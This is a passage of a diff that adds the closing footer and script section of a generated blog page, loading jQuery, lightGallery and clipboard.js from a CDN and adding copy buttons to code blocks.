+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
